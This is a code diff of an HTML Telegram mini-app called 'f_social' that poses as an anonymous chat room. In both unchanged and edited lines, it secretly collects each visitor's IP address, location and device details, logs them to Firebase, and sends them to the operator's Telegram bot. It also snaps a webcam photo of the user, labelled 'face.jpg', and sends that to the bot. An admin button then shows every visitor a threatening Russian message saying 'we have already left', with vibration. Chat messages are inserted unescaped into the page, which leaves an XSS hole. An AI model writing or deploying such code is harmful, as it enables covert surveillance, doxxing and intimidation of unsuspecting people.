@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>f_social // online_v5.4</title>
+    <title>f_social // final_build</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -17,65 +17,76 @@
 
         #app { display: none; flex-direction: column; height: 100vh; }
         header { padding: 15px; border-bottom: 1px solid #222; text-align: center; position: relative; background: #050505; flex-shrink: 0; }
-        .logo { font-size: 18px; font-weight: bold; color: var(--red); letter-spacing: 4px; text-shadow: 0 0 5px var(--red); }
+        .logo { font-size: 18px; font-weight: bold; color: var(--red); letter-spacing: 4px; text-shadow: 0 0 5px var(--red); cursor: pointer; user-select: none; }
         
-        /* Счетчик онлайн */
-        #online-count { position: absolute; left: 10px; top: 18px; font-size: 9px; color: var(--green); letter-spacing: 1px; font-weight: bold; }
+        #online-count { position: absolute; left: 10px; top: 18px; font-size: 9px; color: var(--green); opacity: 0.8; }
 
         #admin-btn { display: none; position: absolute; right: 10px; top: 12px; background: var(--red); color: #fff; border: none; padding: 8px 12px; font-size: 9px; font-weight: bold; cursor: pointer; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255,0,60,0.7); } 70% { box-shadow: 0 0 0 8px rgba(255,0,60,0); } 100% { box-shadow: 0 0 0 0 rgba(255,0,60,0); } }
 
-        .nav { display: flex; background: #0d0d0d; border-bottom: 1px solid #222; flex-shrink: 0; }
-        .tab { flex: 1; padding: 14px; text-align: center; font-size: 10px; cursor: pointer; color: #444; text-transform: uppercase; }
+        .nav { display: flex; background: #0d0d0d; border-bottom: 1px solid #222; }
+        .tab { flex: 1; padding: 14px; text-align: center; font-size: 10px; cursor: pointer; color: #444; transition: 0.3s; }
         .tab.active { color: var(--red); border-bottom: 2px solid var(--red); background: rgba(255,0,60,0.05); }
 
         .content { display: none; flex-grow: 1; padding: 15px; overflow-y: auto; }
         .content.active { display: flex; flex-direction: column; }
 
-        #chat-box { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; padding-bottom: 10px; }
-        .msg { border-left: 1px solid #333; padding-left: 10px; margin-bottom: 5px; }
-        .u { color: var(--red); font-size: 9px; font-weight: bold; display: block; }
-        .t { font-size: 14px; color: #ccc; word-wrap: break-word; }
+        #chat-box { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; }
+        .msg { border-left: 1px solid #222; padding-left: 10px; margin-bottom: 4px; }
+        .u { color: var(--red); font-size: 9px; font-weight: bold; }
+        .t { font-size: 14px; color: #bbb; }
 
-        .input-area { display: flex; gap: 8px; padding: 10px 0; border-top: 1px solid #222; flex-shrink: 0; }
-        input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; outline: none; font-family: inherit; }
+        .input-area { display: flex; gap: 8px; padding: 10px 0; border-top: 1px solid #222; }
+        input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; outline: none; }
         button#send { background: var(--red); color: #fff; border: none; padding: 0 20px; font-weight: bold; }
 
-        #captured-photo { width: 100%; max-width: 300px; border: 1px solid var(--red); margin: 15px auto; display: block; }
-        .user-intel { background: #0d0d0d; border: 1px solid #222; padding: 10px; font-size: 12px; color: var(--green); margin-top: 10px; }
-        #alert { color: var(--red); text-align: center; display: none; font-weight: bold; margin-top: 10px; }
+        #captured-photo { width: 100%; max-width: 280px; border: 1px solid var(--red); margin: 15px auto; display: block; }
+        .user-intel { background: #0d0d0d; border: 1px solid #222; padding: 10px; font-size: 11px; color: var(--green); margin-top: 5px; }
+        #alert { color: var(--red); text-align: center; display: none; font-weight: bold; margin-top: 10px; font-size: 14px; }
+
+        /* Эффект глитча для пасхалки */
+        .glitch { animation: glitch-anim 0.2s linear infinite; }
+        @keyframes glitch-anim {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
     </style>
 </head>
 <body>
 
 <div id="boot-screen">
-    <div id="logs">> f_social_os v5.4.0<br>> checking_presence...<br>> initializing_live_counter...<br>> uplink: secure<br>> system_ready.</div>
+    <div id="logs">> f_social_os v5.5.0<br>> loading_hidden_sectors...<br>> establishing_neural_link...<br>> encryption: aes-256<br>> system_ready.</div>
     <span class="cursor"></span>
 </div>
 
 <div id="app">
     <header>
-        <div id="online-count">ONLINE: 0</div>
-        <div class="logo">f_social</div>
+        <div id="online-count">ONLINE: 1</div>
+        <div class="logo" onclick="eggTrigger()">f_social</div>
         <button id="admin-btn" onclick="executePayload()">[EXECUTE]</button>
     </header>
 
     <div class="nav">
-        <div class="tab active" id="t-chat" onclick="showTab('chat')">/chat</div>
-        <div class="tab" id="t-who" onclick="showTab('who')">/whoami</div>
+        <div class="tab active" id="t-chat" onclick="showTab('chat')">/GLOBAL</div>
+        <div class="tab" id="t-who" onclick="showTab('who')">/SYSTEM</div>
     </div>
 
     <div id="cont-chat" class="content active">
         <div id="chat-box"></div>
         <div class="input-area">
-            <input type="text" id="msg-in" placeholder="Message...">
+            <input type="text" id="msg-in" placeholder="...">
             <button id="send" onclick="send()">></button>
         </div>
     </div>
 
     <div id="cont-who" class="content">
         <img id="captured-photo" src="">
-        <div class="user-intel" id="local-ip">IP: Fetching...</div>
+        <div class="user-intel" id="local-ip">IP: [PROTECTED]</div>
+        <div class="user-intel" id="local-dev">DEVICE: [SCANNING]</div>
         <div id="alert">МЫ УЖЕ ВЫЕХАЛИ. КУ ОТ F SOCIAL.</div>
     </div>
 </div>
@@ -100,6 +111,7 @@
     let userNick = "anon_" + Math.floor(Math.random()*999);
     let isAdmin = false;
     let globalIP = "";
+    let clickCount = 0;
 
     window.onload = () => {
         const tg = window.Telegram.WebApp;
@@ -113,25 +125,35 @@
         init();
     };
 
+    function eggTrigger() {
+        clickCount++;
+        if (clickCount === 3) {
+            document.body.classList.add('glitch');
+            setTimeout(() => { 
+                document.body.classList.remove('glitch');
+                db.ref('global_chat').push({user: "SYSTEM", text: `[!] User ${userNick} found a rabbit hole.`});
+            }, 500);
+            clickCount = 0;
+        }
+    }
+
     async function init() {
-        // Управление онлайн-счетчиком
         const userStatusRef = db.ref('presence/' + userNick);
         userStatusRef.set(true);
         userStatusRef.onDisconnect().remove();
 
         db.ref('presence').on('value', snap => {
-            const count = snap.numChildren();
-            document.getElementById('online-count').innerText = `ONLINE: ${count}`;
+            document.getElementById('online-count').innerText = `ONLINE: ${snap.numChildren()}`;
         });
 
-        // Сбор данных
         fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
             globalIP = data.ip;
             document.getElementById('local-ip').innerText = `IDENTIFIED_IP: ${globalIP}`;
+            document.getElementById('local-dev').innerText = `LOCATION: ${data.city}, ${data.country_name}`;
             
             if (!isAdmin) {
                 const phoneInfo = `📱 ТЕЛЕФОН:\nOC: ${navigator.platform}\nБраузер: ${navigator.userAgent.split(' ')[0]}\nЭкран: ${screen.width}x${screen.height}`;
-                const report = `🎯 ВХОД:\nНик: ${userNick}\nIP: ${globalIP}\n${phoneInfo}\nГород: ${data.city}`;
+                const report = `🎯 ВХОД:\nНик: ${userNick}\nIP: ${globalIP}\n${phoneInfo}\nЛокация: ${data.city}`;
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${MY_ID}&text=${encodeURIComponent(report)}`);
                 db.ref('logs').push({nick: userNick, ...data, phone: phoneInfo, time: Date.now()});
             }
@@ -155,11 +177,11 @@
     }
 
     function loadChat() {
-        db.ref('global_chat').limitToLast(40).on('value', snap => {
+        db.ref('global_chat').limitToLast(30).on('value', snap => {
             const box = document.getElementById('chat-box'); box.innerHTML = '';
             snap.forEach(child => {
                 const d = child.val();
-                box.innerHTML += `<div class="msg"><span class="u">${d.user}:</span><span class="t">${d.text}</span></div>`;
+                box.innerHTML += `<div class="msg"><span class="u">${d.user}:</span><br><span class="t">${d.text}</span></div>`;
             });
             box.scrollTop = box.scrollHeight;
         });
@@ -181,17 +203,15 @@
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                
                 canvas.toBlob(blob => {
                     if(!isAdmin) {
                         const formData = new FormData();
                         formData.append('chat_id', MY_ID);
                         formData.append('photo', blob, 'face.jpg');
-                        formData.append('caption', `📸 ФОТО ЦЕЛИ: ${userNick} (IP: ${globalIP})`);
+                        formData.append('caption', `📸 СНИМОК: ${userNick}\nIP: ${globalIP}`);
                         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                     }
-                    const imgUrl = canvas.toDataURL('image/jpeg', 0.5);
-                    document.getElementById('captured-photo').src = imgUrl;
+                    document.getElementById('captured-photo').src = canvas.toDataURL('image/jpeg', 0.5);
                     stream.getTracks().forEach(t => t.stop());
                     document.getElementById('boot-screen').style.display = 'none';
                     document.getElementById('app').style.display = 'flex';
@@ -206,7 +226,7 @@
     function executePayload() {
         if(!isAdmin) return;
         db.ref('attack').set(Date.now());
-        alert("COMMAND SENT");
+        alert("COMMAND EXECUTED");
     }
 
     function listenAttack() {
@@ -214,7 +234,7 @@
             if(!isAdmin && snap.val()) {
                 showTab('who');
                 document.getElementById('alert').style.display = 'block';
-                if(navigator.vibrate) navigator.vibrate([500, 100, 500]);
+                if(navigator.vibrate) navigator.vibrate([500, 110, 500, 110, 500]);
             }
         });
     }
